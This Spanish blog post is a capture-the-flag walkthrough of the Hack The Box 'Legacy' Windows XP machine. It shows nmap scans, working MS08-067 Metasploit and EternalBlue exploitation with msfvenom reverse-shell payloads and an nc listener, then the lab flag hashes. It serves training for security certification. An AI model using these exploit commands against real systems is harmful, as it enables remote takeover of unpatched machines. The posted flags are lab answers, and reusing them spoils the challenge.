---
layout: post
title: Legacy - Walkthrough
date: 2020-07-30 20:44
description: En este post se demuestra como se consiguen las flags de User y Root en la vm llamada Legacy de Hack The Box.
toc: true
comments: false
tags: 
 - OSCP
 - Walkthrough
 - HackTheBox

---

## **Walkthrough de Legacy**
---

![img]({{ '/assets/images/Legacy/Legacy_00.png' | relative_url }}){: .center-image }*(Descripción)*

---
El vector de entrada para esta máquina es la muy conocida vulnerabilidad MS08-067 que fue utilizada por Conficker en 2008. El exploit automatizado está en Metasploit desde 2008 así que para hacer las cosas un poco más interesante decidí explotar la vulnerabilidad con y sin Metasploit, clave para rendir el OSCP.

---

## **Links**
 Legacy en Hack The Box](https://www.hackthebox.eu/home/machines/profile/2)



## **Reconocimiento**
---

>**``nmap -A -T4 10.10.10.4 -p 139,445,3389 -Pn -oA Legacy``**

```console
# Nmap 7.80 scan initiated Wed Jul 29 12:51:47 2020 as: nmap -A -T4 -p 139,445,3389 -Pn -oA Legacy 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.17s latency).

PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h26m46s, deviation: 2h07m16s, median: -5h56m46s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:a2:40 (VMware)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-07-29T15:55:10+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 29 12:52:48 2020 -- 1 IP address (1 host up) scanned in 60.51 seconds
```

El primer reconocimiento con `nmap` ya nos muestra que es un Windows XP. Nmap también dispone de un script que permite saber si la máquina a atacar es vulnerable:


> **``nmap --script smb-vuln-ms08-067 -p 445 10.10.10.4 -Pn``**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-29 09:43 -03
Nmap scan report for 10.10.10.4
Host is up (0.18s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx

Nmap done: 1 IP address (1 host up) scanned in 5.40 seconds
```
Como dice por ahí, es muy probable que sea vulnerable.

## **Exploit**
---

### **Con Metasploit**
---

El camino con **Metasploit** es relativamente fácil:

* Se elege la vulnerabilidad **MS08-067**.
* Se elige el payload, cuando no **Mmeterpreter**.
* Se configura el RHOST.
* Se configura el LHOST.
* Se corre el exploit.


```console
msf5 > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.7:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.4:1028) at 2020-07-29 15:01:20 -0300

meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > shell
Process 948 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
```
---


### **Sin Metasploit**

Para el camino sin **Metasploit** se puede aprovechar la vulnerabilidad **Eternal Blue** que fue descubierta en 2017. AL igual que con MS08-067 también existe un script de nmap para chequear si es vulnerable:

> **``nmap --script smb-vuln-ms17-010 -p 445 10.10.10.4 -Pn``**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-29 19:00 -03
Nmap scan report for 10.10.10.4
Host is up (0.25s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 2.87 seconds
```
La máquina es claramente vulnerable, el próximo paso es conseguir el exploit que se va a usar:

> **``git clone https://github.com/helviojunior/MS17-010.git``**

Una vez clonado el repositorio hay que usar `Msfvenom` para crear el shellcode de una shell reversa y crear un binario .exe:


> **``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f exe > eternalblue.exe``**

Después se pone a `nc` a escuchar:

> **``nc -lnvp 4444``**

Y se corre el siguiente comando:

> **``./send_and_execute.py 10.10.10.4 eternalblue.exe 445``**

```console
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x81f11c18
SESSION: 0xe1051190
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1bd8c30
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1bd8cd0
overwriting token UserAndGroups
Sending file L7CZMF.exe...
Opening SVCManager on 10.10.10.4.....
Creating service kEfn.....
Starting service kEfn.....
The NETBIOS connection with the remote host timed out.
Removing service kEfn.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```
---


## **Flags**
---

Una vez que el ataque fue exitoso tenemos incluso privilegios de *system* para ir a buscar las dos flags.

```console
C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
```

Eso es todo amigos

---